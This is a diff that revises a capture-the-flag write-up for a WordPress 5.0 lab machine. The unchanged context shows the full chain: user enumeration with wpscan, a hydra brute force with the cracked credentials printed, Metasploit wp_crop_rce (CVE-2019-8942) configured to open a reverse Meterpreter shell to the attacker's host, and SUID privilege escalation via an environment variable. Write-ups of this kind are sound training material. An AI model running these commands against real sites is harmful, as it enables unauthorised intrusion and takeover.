@@ -6,17 +6,16 @@
 **Difficulty:** Medium  
 **Category:** WordPress / CVE-2019-8942 / SUID / PrivEsc
 
-WordPress 5.0 machine exploited through a known image crop RCE vulnerability. SMB shares exist but contain only decoy files. Valid credentials are brute-forced against the WordPress login form, then CVE-2019-8942 (wp_crop_rce) delivers a shell as `www-data`. A non-standard SUID binary — analysed with `strings` — escalates to root by reading an environment variable.
+WordPress 5.0 machine exploited through CVE-2019-8942 (authenticated image crop RCE). SMB share is a decoy; credentials are brute-forced with hydra, then root is obtained via a SUID binary that reads an environment variable.
 
 Attack chain overview:
 
 - Port scan → WordPress 5.0 on port 80, SMB on 139/445
-- SMB `BillySMB` share investigated and eliminated as a rabbit hole (stego decoys)
-- `wpscan` enumerates users `kwheel` and `bjoel`; XML-RPC confirmed enabled
-- `hydra` brute-forces `kwheel:cutiepie1` against the WordPress login form
+- SMB `BillySMB` investigated and eliminated as rabbit hole (stego decoys)
+- `wpscan` enumerates users `kwheel`, `bjoel`; hydra cracks `kwheel:cutiepie1`
 - CVE-2019-8942 via Metasploit `wp_crop_rce` → shell as `www-data`
-- `/home/bjoel/user.txt` is a decoy; real user flag is at `/media/usb/user.txt`
-- SUID `/usr/sbin/checker` → `strings` reveals it calls `getenv("admin")` → `export admin=1` → root
+- `/home/bjoel/user.txt` is a decoy; real user flag at `/media/usb/user.txt`
+- SUID `/usr/sbin/checker` → `strings` reveals `getenv("admin")` → root
 
 ---
 
@@ -109,7 +108,7 @@ wpscan --url http://blog.thm --enumerate u --no-update
   bjoel   (Billy Joel)
 ```
 
-WordPress 5.0 is affected by CVE-2019-8942, a authenticated RCE through the image crop feature — but valid credentials are required first.
+WordPress 5.0 is affected by CVE-2019-8942, an authenticated RCE through the image crop feature — but valid credentials are required first.
 
 ---
 
@@ -174,7 +173,7 @@ msf > use exploit/multi/http/wp_crop_rce
 msf exploit(wp_crop_rce) > set RHOSTS blog.thm
 msf exploit(wp_crop_rce) > set USERNAME kwheel
 msf exploit(wp_crop_rce) > set PASSWORD cutiepie1
-msf exploit(wp_crop_rce) > set LHOST <KALI_IP>
+msf exploit(wp_crop_rce) > set LHOST <LOCAL_IP>
 msf exploit(wp_crop_rce) > set LPORT 4444
 msf exploit(wp_crop_rce) > run
 ```
@@ -186,7 +185,7 @@ msf exploit(wp_crop_rce) > run
 [*] Uploading payload
 [+] Image uploaded
 [*] Including into theme
-[*] Sending stage (45739 bytes) to 10.48.153.33
+[*] Sending stage (45739 bytes) to <TARGET_IP>
 [+] Meterpreter session 1 opened
 ```
 
@@ -275,11 +274,8 @@ Since the binary runs with SUID (as root), and it spawns `/bin/bash` after calli
 ```bash
 export admin=1
 /usr/sbin/checker
-```
-
-```text
-root@blog:~# whoami
-root
+whoami
+# → root
 ```
 
 **ROOT ACCESS GRANTED.** ✅
